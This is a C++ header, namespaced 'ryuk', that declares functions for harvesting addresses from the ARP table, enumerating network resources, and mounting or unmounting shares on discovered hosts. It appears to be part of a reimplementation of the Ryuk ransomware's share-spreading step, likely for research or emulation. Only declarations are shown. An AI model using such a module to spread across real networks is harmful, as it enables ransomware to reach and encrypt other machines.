#ifndef RYUK_MOUNT_SHARE_OPERATIONS_H_
#define RYUK_MOUNT_SHARE_OPERATIONS_H_

#include <numeric>
#include <string>
#include <regex>
#include <vector>

#include <tchar.h>
#include <windows.h>
#include <winnetwk.h>
#include <iphlpapi.h>

#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

namespace ryuk {

	void GetARPTableAddresses(std::vector<CHAR*>* ipAddresses);

	BOOL IsLocalIP(const CHAR* ipAddr);
	
	BOOL EnumerateResources(LPNETRESOURCE lpNetResource, BOOL bVerbosePrint);
	
	BOOL MountShare(LPNETRESOURCE lpNetResource);

	BOOL DisconnectMountShare(LPNETRESOURCE lpNetResource, BOOL forceDisconnect);

	void LoopAndAttemptDriveMountOnAddresses(std::vector<CHAR*>* ipAddresses, std::vector<LPNETRESOURCE>* resourceList, std::vector<std::wstring>* mountedDriveLetters);

	void LoopAndUnmountMappedDrives(std::vector<LPNETRESOURCE>* resourceList, BOOL forceDisconnect);

	void VerbosePrintResource(int i, LPNETRESOURCE lpnrLocal);

	void ClearIPResources(std::vector<CHAR*>* ipResources);

	void ClearNetResources(std::vector<LPNETRESOURCE>* resourceList);

} // namespace ryuk

#endif RYUK_MOUNT_SHARE_OPERATIONS_H_
